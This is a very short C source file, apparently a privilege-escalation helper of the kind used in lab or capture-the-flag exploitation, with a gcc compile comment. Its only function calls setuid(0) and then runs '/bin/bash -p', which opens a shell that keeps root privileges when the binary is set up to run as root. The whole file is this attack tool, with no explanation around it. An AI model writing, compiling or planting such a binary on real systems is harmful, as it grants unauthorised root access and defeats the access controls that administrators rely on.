// gcc bin.c -o bin

int main() {
    setuid(0);
    system("/bin/bash -p");
}
